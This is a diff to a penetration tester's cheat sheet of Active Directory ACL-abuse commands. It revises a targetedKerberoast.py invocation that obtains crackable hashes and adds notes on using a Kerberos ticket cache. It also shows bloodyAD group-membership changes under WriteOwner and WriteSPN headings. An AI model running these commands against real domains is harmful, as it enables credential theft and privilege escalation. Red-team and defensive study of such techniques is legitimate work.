@@ -1,6 +1,6 @@
 # acl
 
-% ACL, Impacket, BloodyAD, TargetedKerberoast
+% ACL, Impacket, BloodyAD
 
 ## WriteOwner - Impacket
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/PRIVILEGE-ESCALATION
@@ -27,14 +27,15 @@ bloodyAD --host <IP> -u <Username> -p <Password> add groupMember <Group> <Member
 ## WriteSPN - Targeted Kerberoast
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/KERBEROASTING
 
-The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.
+Note:
 
-The recovered hash can be cracked offline using the tool of your choice.
+When using kerberos authentication, make sure you export the KRB5CCNAME environment variable pointing to your valid Kerberos ticket cache file.
 
-Note: <Creds_Options> can be either -p (for password) or -H (for NT hash)
+And empty the password field.
+
 
 ```bash
-targetedKerberoast.py -v -d <Domain> -u <Username> <Creds_Options> <Password> -o targeted_kerberoast_hashes.txt
+targetedKerberoast.py -v -d <Domain> --dc-host <DC_Host> -u <Username> <Creds_Options|-p|-k --no-pass> <Password> -o targeted_kerberoast_hashes.txt
 ```
 
 ## Shadow Credentials Attack
